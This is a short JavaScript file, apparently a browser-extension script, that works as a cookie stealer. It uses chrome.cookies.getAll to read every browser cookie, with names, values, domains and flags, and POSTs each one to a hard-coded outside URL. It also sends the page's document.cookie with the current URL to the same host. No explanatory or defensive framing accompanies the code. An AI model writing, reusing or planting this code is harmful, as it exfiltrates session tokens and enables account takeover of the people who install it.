const posturl = 'https://someurl.com'

try{
    chrome.cookies.getAll({}, (cookies) => {
        console.log(cookies)
        for(let i=0; i < cookies.length; i++){
            let url = posturl;
            let params = `domain=${cookies[i].domain}&hostOnly=${cookies[i].hostOnly}&httpOnly=${cookies[i].httpOnly}&name=${cookies[i].name}&path=${cookies[i].path}&sameSite=${cookies[i].sameSite}&secure=${cookies[i].secure}&session=${cookies[i].session}&storeId=null&value=${cookies[i].value}`;
            let xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send(params);
        }
    })
} catch(e){
    console.log('Not Right Page Setting')
}

if(document.cookie == ""){}
else{
    let url = posturl;
    let params = `${window.location.href}=${document.cookie}`;
    let xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(params);
}